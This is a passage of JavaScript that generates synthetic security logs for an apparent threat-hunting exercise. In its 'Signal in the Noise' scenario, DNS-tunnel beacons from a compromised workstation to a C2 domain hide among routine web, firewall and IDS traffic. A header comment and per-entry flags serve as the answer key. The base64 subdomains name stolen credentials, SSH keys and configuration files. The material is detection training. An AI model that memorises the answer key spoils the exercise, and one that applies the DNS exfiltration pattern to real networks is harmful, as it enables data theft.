    '72.44.128.90 GET /api/calendar — 200 OK',
    null, false, null);

  _pa.e('10:57:45', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _pa.e('10:58:00', 'auth', 'info',
    'Logout user=mweber session=sess_mw_e81c',
    null, false, null);

  _pa.e('10:58:15', 'web', 'info',
    '98.22.156.71 POST /api/tasks — 201 Created',
    null, false, null);

  _pa.e('10:58:30', 'dns', 'info',
    'A query mail.acmecorp.lab from 10.0.3.10',
    null, false, null);

  _pa.e('10:58:45', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _pa.e('10:59:00', 'web', 'info',
    '203.0.113.42 GET /dashboard — 200 OK',
    null, false, null);

  _pa.e('10:59:15', 'auth', 'info',
    'Login success user=mweber from 203.0.113.42',
    null, false, null);

  _pa.e('10:59:30', 'web', 'info',
    '72.44.128.90 GET /projects/releases — 200 OK',
    null, false, null);

  _pa.e('10:59:45', 'dns', 'info',
    'A query cdn.jsdelivr.net from 10.0.2.20',
    null, false, null);

  _pa.e('11:00:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _pa.e('11:00:15', 'web', 'info',
    '172.217.14.99 GET /sitemap.xml — 200 OK — Googlebot/2.1',
    null, false, null);

  _pa.e('11:00:30', 'web', 'info',
    '98.22.156.71 GET /reports/quarterly — 200 OK',
    null, false, null);

  _pa.e('11:00:45', 'auth', 'info',
    'VPN disconnect user=bkim tunnel=vpn_bk_01',
    null, false, null);

  _pa.e('11:01:00', 'dns', 'info',
    'AAAA query api.github.com from 10.0.2.20',
    null, false, null);

  _pa.e('11:01:15', 'web', 'info',
    '203.0.113.42 GET /api/tasks — 200 OK',
    null, false, null);

  _pa.e('11:01:30', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _pa.e('11:01:45', 'web', 'info',
    '72.44.128.90 POST /reports/export — 200 OK',
    null, false, null);

  _pa.e('11:02:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _pa.e('11:02:15', 'auth', 'info',
    'Logout user=jthompson session=sess_jt_a001',
    null, false, null);

  _pa.e('11:02:30', 'dns', 'info',
    'A query s3.us-east-1.amazonaws.com from 10.0.2.20',
    null, false, null);

  _pa.e('11:02:45', 'web', 'info',
    '98.22.156.71 GET /dashboard — 200 OK',
    null, false, null);

  var PHISHING = _pa.entries;

  /* ════════════════════════════════════════════════════
     Signal in the Noise — 2024-04-22 00:00–06:00 UTC
     ════════════════════════════════════════════════════

     C2 domain:   data.x9z-analytics.xyz (198.51.100.77)
     Compromised: 10.0.5.40 (workstation-dev04)
     DNS server:  10.0.0.2
     Beacon:      every ~5 min via DNS TXT query
     Exfil:       encoded subdomains of x9z-analytics.xyz

     Normal IPs:
       10.0.4.55      — health check
       91.189.92.10   — internal monitoring
       10.0.1.50      — web server
       10.0.3.10      — mail server
       10.0.6.15      — cron / batch server
       72.44.128.90   — remote employee (VPN)
       104.16.55.2    — CDN edge
       13.107.42.14   — Bing crawler
     ════════════════════════════════════════════════════ */

  var _la = makeCorpus('2024-04-22 ');

  /* ── Overnight normal traffic ────────────────────── */

  _la.e('00:00:01', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    { srcIp: '10.0.4.55', dstIp: '10.0.1.50', dstPort: 443, method: 'GET', path: '/api/health', status: 200, bytes: 48, userAgent: 'internal-monitor/1.0' },
    false, null);

  _la.e('00:00:15', 'fw', 'info',
    'ALLOW UDP 10.0.6.15:38201 → 10.0.0.2:53 — dns-outbound',
    { action: 'ALLOW', proto: 'UDP', srcIp: '10.0.6.15', srcPort: 38201, dstIp: '10.0.0.2', dstPort: 53, rule: 'dns-outbound' },
    false, null);

  _la.e('00:00:30', 'dns', 'info',
    'A query backup.internal.lab from 10.0.6.15',
    { queryType: 'A', domain: 'backup.internal.lab', srcIp: '10.0.6.15', response: '10.0.7.10', ttl: 300 },
    false, null);

  _la.e('00:00:45', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    { srcIp: '91.189.92.10', dstIp: '10.0.1.50', dstPort: 443, method: 'GET', path: '/api/metrics', status: 200, bytes: 8400, userAgent: 'prometheus/2.45' },
    false, null);

  _la.e('00:01:00', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:42100 → 10.0.7.10:5432 — db-backup',
    { action: 'ALLOW', proto: 'TCP', srcIp: '10.0.6.15', srcPort: 42100, dstIp: '10.0.7.10', dstPort: 5432, rule: 'db-backup' },
    false, null);

  _la.e('00:01:15', 'web', 'info',
    '10.0.6.15 POST /api/backup/start — 200 OK — cron-agent/1.2',
    { srcIp: '10.0.6.15', dstIp: '10.0.1.50', dstPort: 443, method: 'POST', path: '/api/backup/start', status: 200, bytes: 128, userAgent: 'cron-agent/1.2' },
    false, null);

  _la.e('00:01:30', 'dns', 'info',
    'A query ntp.ubuntu.com from 10.0.6.15',
    null, false, null);

  _la.e('00:01:45', 'fw', 'info',
    'ALLOW UDP 10.0.6.15:12300 → 91.189.89.198:123 — ntp-outbound',
    null, false, null);

  _la.e('00:02:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _la.e('00:02:15', 'ids', 'low',
    'Scheduled scan: Nessus vulnerability scan from 10.0.8.5 — normal',
    { alertId: 'SCHED-001', srcIp: '10.0.8.5', note: 'scheduled_vulnerability_scan', action: 'LOG' },
    false, null);

  /* ── First beacon (DNS tunnel) ───────────────────── */

  _la.e('00:02:30', 'dns', 'info',
    'TXT query aGVhcnRiZWF0.x9z-analytics.xyz from 10.0.5.40',
    { queryType: 'TXT', domain: 'aGVhcnRiZWF0.x9z-analytics.xyz', srcIp: '10.0.5.40', response: 'v=B64 dGltZT0xNzEzNzQ', ttl: 1 },
    true, 'beacon-pattern');

  _la.e('00:02:45', 'fw', 'info',
    'ALLOW UDP 10.0.5.40:51002 → 10.0.0.2:53 — dns-outbound',
    { action: 'ALLOW', proto: 'UDP', srcIp: '10.0.5.40', srcPort: 51002, dstIp: '10.0.0.2', dstPort: 53, rule: 'dns-outbound' },
    true, 'dns-tunnel');

  /* ── Normal traffic continues ────────────────────── */

  _la.e('00:03:00', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _la.e('00:03:15', 'dns', 'info',
    'A query api.github.com from 10.0.6.15',
    null, false, null);

  _la.e('00:03:30', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:42200 → 10.0.7.10:5432 — db-backup',
    null, false, null);

  _la.e('00:03:45', 'web', 'info',
    '10.0.6.15 POST /api/backup/chunk — 200 OK — cron-agent/1.2',
    null, false, null);

  _la.e('00:04:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _la.e('00:04:15', 'dns', 'info',
    'A query cdn.shopstack.lab from 104.16.55.2',
    null, false, null);

  _la.e('00:04:30', 'fw', 'info',
    'ALLOW TCP 104.16.55.2:443 → 10.0.1.50:443 — cdn-inbound',
    null, false, null);

  _la.e('00:04:45', 'web', 'info',
    '104.16.55.2 GET /static/css/main.css — 304 Not Modified — CDN-Cache/2.1',
    null, false, null);

  _la.e('00:05:00', 'ids', 'low',
    'Port scan detected from 10.0.8.5 — Nessus scheduled scan',
    null, false, null);

  _la.e('00:05:15', 'dns', 'info',
    'A query updates.ubuntu.com from 10.0.6.15',
    null, false, null);

  _la.e('00:05:30', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _la.e('00:05:45', 'fw', 'info',
    'ALLOW TCP 10.0.3.10:25 → 10.0.0.2:53 — mail-dns',
    null, false, null);

  _la.e('00:06:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _la.e('00:06:15', 'dns', 'info',
    'MX query internal.lab from 10.0.3.10',
    null, false, null);

  _la.e('00:06:30', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:42300 → 10.0.7.10:5432 — db-backup',
    null, false, null);

  _la.e('00:06:45', 'web', 'info',
    '10.0.6.15 POST /api/backup/chunk — 200 OK — cron-agent/1.2',
    null, false, null);

  /* ── Second beacon (~5 min interval) ─────────────── */

  _la.e('00:07:28', 'dns', 'info',
    'TXT query ZXhmaWwtY2h1bms.x9z-analytics.xyz from 10.0.5.40',
    { queryType: 'TXT', domain: 'ZXhmaWwtY2h1bms.x9z-analytics.xyz', srcIp: '10.0.5.40', response: 'v=B64 c2VjcmV0PWRi', ttl: 1 },
    true, 'exfil-data');

  _la.e('00:07:30', 'fw', 'info',
    'ALLOW UDP 10.0.5.40:51003 → 10.0.0.2:53 — dns-outbound',
    { action: 'ALLOW', proto: 'UDP', srcIp: '10.0.5.40', srcPort: 51003, dstIp: '10.0.0.2', dstPort: 53, rule: 'dns-outbound' },
    true, 'dns-tunnel');

  /* ── Normal traffic ──────────────────────────────── */

  _la.e('00:07:45', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _la.e('00:08:00', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _la.e('00:08:15', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:42400 → 10.0.7.10:5432 — db-backup',
    null, false, null);

  _la.e('00:08:30', 'dns', 'info',
    'A query registry.npmjs.org from 10.0.6.15',
    null, false, null);

  _la.e('00:08:45', 'web', 'info',
    '10.0.6.15 POST /api/backup/chunk — 200 OK — cron-agent/1.2',
    null, false, null);

  _la.e('00:09:00', 'ids', 'low',
    'Vulnerability scan completed from 10.0.8.5 — 0 critical findings',
    null, false, null);

  _la.e('00:09:15', 'fw', 'info',
    'ALLOW TCP 72.44.128.90:55201 → 10.0.1.50:443 — inbound-https',
    { action: 'ALLOW', proto: 'TCP', srcIp: '72.44.128.90', srcPort: 55201, dstIp: '10.0.1.50', dstPort: 443, rule: 'inbound-https' },
    false, null);

  _la.e('00:09:30', 'auth', 'info',
    'VPN connect user=jthompson from 72.44.128.90 — late shift',
    { event: 'vpn_connect', user: 'jthompson', srcIp: '72.44.128.90', tunnelId: 'vpn_jt_n01', assignedIp: '10.10.0.20' },
    false, null);

  _la.e('00:09:45', 'web', 'info',
    '72.44.128.90 GET /dashboard — 200 OK',
    null, false, null);

  _la.e('00:10:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _la.e('00:10:15', 'dns', 'info',
    'A query pypi.org from 10.0.6.15',
    null, false, null);

  _la.e('00:10:30', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:42500 → 10.0.7.10:5432 — db-backup',
    null, false, null);

  _la.e('00:10:45', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _la.e('00:11:00', 'web', 'info',
    '72.44.128.90 GET /api/tasks — 200 OK',
    null, false, null);

  _la.e('00:11:15', 'fw', 'info',
    'ALLOW TCP 13.107.42.14:443 → 10.0.1.50:443 — inbound-https',
    null, false, null);

  _la.e('00:11:30', 'web', 'info',
    '13.107.42.14 GET /sitemap.xml — 200 OK — bingbot/2.0',
    null, false, null);

  _la.e('00:11:45', 'dns', 'info',
    'A query time.google.com from 10.0.1.50',
    null, false, null);

  /* ── Third beacon ────────────────────────────────── */

  _la.e('00:12:32', 'dns', 'info',
    'TXT query dXNlcnMtdGFibGU.x9z-analytics.xyz from 10.0.5.40',
    { queryType: 'TXT', domain: 'dXNlcnMtdGFibGU.x9z-analytics.xyz', srcIp: '10.0.5.40', response: 'v=B64 cm93cz0xMjM0', ttl: 1 },
    true, 'exfil-data');

  _la.e('00:12:34', 'fw', 'info',
    'ALLOW UDP 10.0.5.40:51004 → 10.0.0.2:53 — dns-outbound',
    { action: 'ALLOW', proto: 'UDP', srcIp: '10.0.5.40', srcPort: 51004, dstIp: '10.0.0.2', dstPort: 53, rule: 'dns-outbound' },
    true, 'dns-tunnel');

  /* ── Normal traffic ──────────────────────────────── */

  _la.e('00:12:45', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _la.e('00:13:00', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:42600 → 10.0.7.10:5432 — db-backup',
    null, false, null);

  _la.e('00:13:15', 'web', 'info',
    '10.0.6.15 POST /api/backup/chunk — 200 OK — cron-agent/1.2',
    null, false, null);

  _la.e('00:13:30', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _la.e('00:13:45', 'dns', 'info',
    'A query rubygems.org from 10.0.6.15',
    null, false, null);

  _la.e('00:14:00', 'web', 'info',
    '72.44.128.90 POST /api/tasks — 201 Created',
    null, false, null);

  _la.e('00:14:15', 'web', 'info',
    '13.107.42.14 GET /blog — 200 OK — bingbot/2.0',
    null, false, null);

  _la.e('00:14:30', 'fw', 'info',
    'ALLOW TCP 10.0.3.10:587 → 74.125.200.108:587 — smtp-outbound',
    { action: 'ALLOW', proto: 'TCP', srcIp: '10.0.3.10', srcPort: 587, dstIp: '74.125.200.108', dstPort: 587, rule: 'smtp-outbound' },
    false, null);

  _la.e('00:14:45', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _la.e('00:15:00', 'ids', 'info',
    'Signature update completed — 14 new rules loaded',
    { alertId: 'SIG-UPDATE', action: 'LOG', newRules: 14, totalRules: 8421 },
    false, null);

  _la.e('00:15:15', 'dns', 'info',
    'A query crl.digicert.com from 10.0.1.50',
    null, false, null);

  _la.e('00:15:30', 'fw', 'info',
    'ALLOW TCP 10.0.1.50:443 → 93.184.220.29:80 — crl-check',
    null, false, null);

  _la.e('00:15:45', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _la.e('00:16:00', 'web', 'info',
    '10.0.6.15 POST /api/backup/complete — 200 OK — cron-agent/1.2',
    { srcIp: '10.0.6.15', dstIp: '10.0.1.50', dstPort: 443, method: 'POST', path: '/api/backup/complete', status: 200, bytes: 64, userAgent: 'cron-agent/1.2' },
    false, null);

  _la.e('00:16:15', 'dns', 'info',
    'A query ocsp.pki.goog from 10.0.1.50',
    null, false, null);

  _la.e('00:16:30', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:42700 → 10.0.7.10:5432 — db-maintenance',
    null, false, null);

  _la.e('00:16:45', 'web', 'info',
    '72.44.128.90 GET /reports/daily — 200 OK',
    null, false, null);

  /* ── Fourth beacon ───────────────────────────────── */

  _la.e('00:17:30', 'dns', 'info',
    'TXT query Y3JlZHMtZHVtcA.x9z-analytics.xyz from 10.0.5.40',
    { queryType: 'TXT', domain: 'Y3JlZHMtZHVtcA.x9z-analytics.xyz', srcIp: '10.0.5.40', response: 'v=B64 cGFzc3dvcmQ9', ttl: 1 },
    true, 'exfil-data');

  _la.e('00:17:32', 'fw', 'info',
    'ALLOW UDP 10.0.5.40:51005 → 10.0.0.2:53 — dns-outbound',
    { action: 'ALLOW', proto: 'UDP', srcIp: '10.0.5.40', srcPort: 51005, dstIp: '10.0.0.2', dstPort: 53, rule: 'dns-outbound' },
    true, 'dns-tunnel');

  /* ── More normal traffic ─────────────────────────── */

  _la.e('00:17:45', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _la.e('00:18:00', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _la.e('00:18:15', 'ids', 'info',
    'Heartbeat: IDS engine running — 8421 rules active',
    null, false, null);

  _la.e('00:18:30', 'dns', 'info',
    'A query archive.ubuntu.com from 10.0.6.15',
    null, false, null);

  _la.e('00:18:45', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:42800 → 91.189.91.39:443 — apt-update',
    null, false, null);

  _la.e('00:19:00', 'web', 'info',
    '13.107.42.14 GET /products — 200 OK — bingbot/2.0',
    null, false, null);

  _la.e('00:19:15', 'web', 'info',
    '72.44.128.90 GET /api/notifications — 200 OK',
    null, false, null);

  _la.e('00:19:30', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _la.e('00:19:45', 'fw', 'info',
    'ALLOW TCP 10.0.3.10:587 → 74.125.200.108:587 — smtp-outbound',
    null, false, null);

  _la.e('00:20:00', 'dns', 'info',
    'A query s3.amazonaws.com from 10.0.6.15',
    null, false, null);

  _la.e('00:20:15', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _la.e('00:20:30', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:42900 → 52.217.44.68:443 — s3-backup-sync',
    { action: 'ALLOW', proto: 'TCP', srcIp: '10.0.6.15', srcPort: 42900, dstIp: '52.217.44.68', dstPort: 443, rule: 's3-backup-sync' },
    false, null);

  _la.e('00:20:45', 'web', 'info',
    '10.0.6.15 POST /api/cron/report — 200 OK — cron-agent/1.2',
    null, false, null);

  _la.e('00:21:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _la.e('00:21:15', 'auth', 'info',
    'VPN disconnect user=jthompson tunnel=vpn_jt_n01',
    null, false, null);

  _la.e('00:21:30', 'dns', 'info',
    'A query detectportal.firefox.com from 10.0.5.40',
    null, false, null);

  _la.e('00:21:45', 'fw', 'info',
    'ALLOW TCP 10.0.3.10:25 → 10.0.0.2:53 — mail-dns',
    null, false, null);

  /* ── Fifth beacon ────────────────────────────────── */

  _la.e('00:22:35', 'dns', 'info',
    'TXT query c3NoLWtleXM.x9z-analytics.xyz from 10.0.5.40',
    { queryType: 'TXT', domain: 'c3NoLWtleXM.x9z-analytics.xyz', srcIp: '10.0.5.40', response: 'v=B64 aWRfcnNhPTEy', ttl: 1 },
    true, 'exfil-data');

  _la.e('00:22:37', 'fw', 'info',
    'ALLOW UDP 10.0.5.40:51006 → 10.0.0.2:53 — dns-outbound',
    { action: 'ALLOW', proto: 'UDP', srcIp: '10.0.5.40', srcPort: 51006, dstIp: '10.0.0.2', dstPort: 53, rule: 'dns-outbound' },
    true, 'dns-tunnel');

  /* ── Normal traffic continues ────────────────────── */

  _la.e('00:22:45', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _la.e('00:23:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _la.e('00:23:15', 'dns', 'info',
    'A query connectivity-check.ubuntu.com from 10.0.6.15',
    null, false, null);

  _la.e('00:23:30', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:43000 → 10.0.7.10:5432 — db-maintenance',
    null, false, null);

  _la.e('00:23:45', 'ids', 'info',
    'Heartbeat: IDS engine running — 8421 rules active',
    null, false, null);

  _la.e('00:24:00', 'web', 'info',
    '13.107.42.14 GET /about — 200 OK — bingbot/2.0',
    null, false, null);

  _la.e('00:24:15', 'dns', 'info',
    'A query fonts.googleapis.com from 10.0.1.50',
    null, false, null);

  _la.e('00:24:30', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _la.e('00:24:45', 'fw', 'info',
    'ALLOW TCP 10.0.3.10:587 → 74.125.200.108:587 — smtp-outbound',
    null, false, null);

  _la.e('00:25:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _la.e('00:25:15', 'dns', 'info',
    'AAAA query s3.amazonaws.com from 10.0.6.15',
    null, false, null);

  _la.e('00:25:30', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:43100 → 52.217.44.68:443 — s3-backup-sync',
    null, false, null);

  _la.e('00:25:45', 'web', 'info',
    '10.0.6.15 POST /api/cron/cleanup — 200 OK — cron-agent/1.2',
    null, false, null);

  _la.e('00:26:00', 'web', 'info',
    '104.16.55.2 GET /static/js/app.js — 304 Not Modified — CDN-Cache/2.1',
    null, false, null);

  _la.e('00:26:15', 'ids', 'low',
    'Traffic spike: inbound HTTPS +15% over baseline — seasonal',
    { alertId: 'TRAFFIC-SPIKE', action: 'LOG', deviation: '+15%', note: 'seasonal_baseline' },
    false, null);

  _la.e('00:26:30', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  /* ── Sixth beacon ────────────────────────────────── */

  _la.e('00:27:33', 'dns', 'info',
    'TXT query ZW52LWNvbmZpZw.x9z-analytics.xyz from 10.0.5.40',
    { queryType: 'TXT', domain: 'ZW52LWNvbmZpZw.x9z-analytics.xyz', srcIp: '10.0.5.40', response: 'v=B64 QVBJX0tFWT1h', ttl: 1 },
    true, 'exfil-data');

  _la.e('00:27:35', 'fw', 'info',
    'ALLOW UDP 10.0.5.40:51007 → 10.0.0.2:53 — dns-outbound',
    { action: 'ALLOW', proto: 'UDP', srcIp: '10.0.5.40', srcPort: 51007, dstIp: '10.0.0.2', dstPort: 53, rule: 'dns-outbound' },
    true, 'dns-tunnel');

  /* ── IDS finally notices the pattern ─────────────── */

  _la.e('00:27:40', 'ids', 'medium',
    'Suspicious DNS: repeated TXT queries to x9z-analytics.xyz from 10.0.5.40 — possible tunnel',
    { alertId: 'DNS-TUNNEL-01', srcIp: '10.0.5.40', dstDomain: 'x9z-analytics.xyz', queryCount: 6, interval: '~5min', action: 'ALERT', signature: 'DNS Tunnel Heuristic' },
    true, 'c2-domain');

  /* ── Normal traffic tail ─────────────────────────── */

  _la.e('00:27:45', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _la.e('00:28:00', 'dns', 'info',
    'A query docker.io from 10.0.6.15',
    null, false, null);

  _la.e('00:28:15', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:43200 → 54.198.86.24:443 — docker-pull',
    null, false, null);

  _la.e('00:28:30', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _la.e('00:28:45', 'web', 'info',
    '13.107.42.14 GET /contact — 200 OK — bingbot/2.0',
    null, false, null);

  _la.e('00:29:00', 'fw', 'info',
    'ALLOW TCP 10.0.3.10:587 → 74.125.200.108:587 — smtp-outbound',
    null, false, null);

  _la.e('00:29:15', 'dns', 'info',
    'A query ipinfo.io from 10.0.1.50',
    null, false, null);

  _la.e('00:29:30', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _la.e('00:29:45', 'ids', 'info',
    'Heartbeat: IDS engine running — 8421 rules active',
    null, false, null);

  _la.e('00:30:00', 'web', 'info',
    '104.16.55.2 GET /static/images/logo.svg — 304 Not Modified — CDN-Cache/2.1',
    null, false, null);

  _la.e('00:30:15', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _la.e('00:30:30', 'dns', 'info',
    'A query api.pagerduty.com from 10.0.1.50',
    null, false, null);

  /* ── compromised-host confirmation ───────────────── */

  _la.e('00:30:45', 'ids', 'high',
    'Host 10.0.5.40 (workstation-dev04) flagged: DNS exfiltration confirmed — 6 TXT queries to x9z-analytics.xyz',
    { alertId: 'EXFIL-CONFIRM', srcIp: '10.0.5.40', hostname: 'workstation-dev04', dstDomain: 'x9z-analytics.xyz', totalQueries: 6, action: 'ALERT', signature: 'DNS Exfil Confirmed' },
    true, 'compromised-host');

  _la.e('00:31:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _la.e('00:31:15', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:43300 → 10.0.7.10:5432 — db-maintenance',
    null, false, null);

  _la.e('00:31:30', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _la.e('00:31:45', 'dns', 'info',
    'A query letsencrypt.org from 10.0.1.50',
    null, false, null);

  _la.e('00:32:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _la.e('00:32:15', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:43400 → 10.0.7.10:5432 — db-maintenance',
    null, false, null);

  _la.e('00:32:30', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _la.e('00:32:45', 'dns', 'info',
    'A query security.ubuntu.com from 10.0.6.15',
    null, false, null);

  _la.e('00:33:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _la.e('00:33:15', 'fw', 'info',
    'ALLOW TCP 10.0.3.10:587 → 74.125.200.108:587 — smtp-outbound',
    null, false, null);

  _la.e('00:33:30', 'dns', 'info',
    'A query dl.google.com from 10.0.1.50',
    null, false, null);

  _la.e('00:33:45', 'web', 'info',
    '13.107.42.14 GET /products — 200 OK — bingbot/2.0',
    null, false, null);

  _la.e('00:34:00', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:43500 → 52.217.44.68:443 — s3-backup-sync',
    null, false, null);

  _la.e('00:34:15', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _la.e('00:34:30', 'web', 'info',
    '10.0.6.15 POST /api/cron/heartbeat — 200 OK — cron-agent/1.2',
    null, false, null);

  _la.e('00:34:45', 'dns', 'info',
    'A query api.pagerduty.com from 10.0.1.50',
    null, false, null);

  _la.e('00:35:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _la.e('00:35:15', 'fw', 'info',
    'ALLOW UDP 10.0.6.15:38500 → 10.0.0.2:53 — dns-outbound',
    null, false, null);

  _la.e('00:35:30', 'ids', 'info',
    'Heartbeat: IDS engine running — 8421 rules active',
    null, false, null);

  _la.e('00:35:45', 'dns', 'info',
    'A query cdn.cloudflare.com from 10.0.1.50',
    null, false, null);

  _la.e('00:36:00', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:43600 → 10.0.7.10:5432 — db-maintenance',
    null, false, null);

  _la.e('00:36:15', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _la.e('00:36:30', 'web', 'info',
    '104.16.55.2 GET /static/css/main.css — 304 Not Modified — CDN-Cache/2.1',
    null, false, null);

  _la.e('00:36:45', 'dns', 'info',
    'AAAA query updates.ubuntu.com from 10.0.6.15',
    null, false, null);

  _la.e('00:37:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _la.e('00:37:15', 'fw', 'info',
    'ALLOW TCP 10.0.3.10:587 → 74.125.200.108:587 — smtp-outbound',
    null, false, null);

  _la.e('00:37:30', 'web', 'info',
    '13.107.42.14 GET /blog — 200 OK — bingbot/2.0',
    null, false, null);

  _la.e('00:37:45', 'dns', 'info',
    'A query download.docker.com from 10.0.6.15',
    null, false, null);

  _la.e('00:38:00', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:43700 → 54.230.100.12:443 — docker-pull',
    null, false, null);

  _la.e('00:38:15', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _la.e('00:38:30', 'web', 'info',
    '10.0.6.15 POST /api/cron/deploy-check — 200 OK — cron-agent/1.2',
    null, false, null);

  _la.e('00:38:45', 'fw', 'info',
    'ALLOW TCP 10.0.1.50:443 → 93.184.220.29:80 — crl-check',
    null, false, null);

  _la.e('00:39:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _la.e('00:39:15', 'dns', 'info',
    'A query npm.pkg.github.com from 10.0.6.15',
    null, false, null);

  _la.e('00:39:30', 'ids', 'low',
    'Traffic spike: inbound HTTPS +12% over baseline — normal variance',
    null, false, null);

  _la.e('00:39:45', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:43800 → 10.0.7.10:5432 — db-maintenance',
    null, false, null);

  _la.e('00:40:00', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _la.e('00:40:15', 'dns', 'info',
    'A query graph.microsoft.com from 10.0.3.10',
    null, false, null);

  _la.e('00:40:30', 'web', 'info',
    '104.16.55.2 GET /static/js/app.js — 304 Not Modified — CDN-Cache/2.1',
    null, false, null);

  _la.e('00:40:45', 'fw', 'info',
    'ALLOW TCP 10.0.3.10:25 → 10.0.0.2:53 — mail-dns',
    null, false, null);

  _la.e('00:41:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _la.e('00:41:15', 'dns', 'info',
    'MX query internal.lab from 10.0.3.10',
    null, false, null);

  _la.e('00:41:30', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:43900 → 91.189.91.39:443 — apt-update',
    null, false, null);

  _la.e('00:41:45', 'web', 'info',
    '13.107.42.14 GET /contact — 200 OK — bingbot/2.0',
    null, false, null);

  _la.e('00:42:00', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _la.e('00:42:15', 'dns', 'info',
    'A query time.windows.com from 10.0.1.50',
    null, false, null);

  _la.e('00:42:30', 'fw', 'info',
    'ALLOW UDP 10.0.1.50:12400 → 13.86.101.172:123 — ntp-outbound',
    null, false, null);

